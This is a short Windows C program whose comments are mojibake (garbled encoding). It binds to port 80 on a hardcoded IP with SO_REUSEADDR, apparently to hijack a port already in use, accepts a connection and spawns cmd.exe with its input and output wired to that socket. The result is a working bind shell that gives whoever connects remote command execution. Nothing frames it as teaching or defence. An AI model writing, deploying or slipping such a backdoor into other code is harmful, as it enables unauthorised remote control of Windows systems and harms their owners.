// �˿�����

#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
int main()
{
    WSADATA ws;
    SOCKET listenFD;
    int ret;
    //��ʼ��wsa
    WSAStartup(MAKEWORD(2, 2), &ws);
    //ע��Ҫ��WSASocket
    listenFD = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    //�����׽���ѡ�SO_REUSEADDRѡ����ǿ���ʵ�ֶ˿��ذ󶨵�
    //�����ָ����SO_EXCLUSIVEADDRUSE���Ͳ���󶨳ɹ�
    BOOL  val = TRUE;
    setsockopt(listenFD, SOL_SOCKET, SO_REUSEADDR, (char *)&val, sizeof(val) );
    //��������21�˿�
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(80);
    server.sin_addr.s_addr = inet_addr("12.1.40.217");
    ret = bind(listenFD, (sockaddr *)&server, sizeof(server));
    ret = listen(listenFD, 2);
    //����ͻ�����80�˿ڣ���������
    int iAddrSize = sizeof(server);
    SOCKET clientFD = accept(listenFD, (sockaddr *)&server, &iAddrSize);
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    //����Ϊ����������ΪSocket
    si.hStdInput = si.hStdOutput = si.hStdError = (void *)clientFD;
    char cmdLine[] = "cmd";
    PROCESS_INFORMATION ProcessInformation;
    //��������
    ret = CreateProcess(NULL, cmdLine, NULL, NULL, 1, 0, NULL, NULL, &si, &ProcessInformation);
    return 0;
}
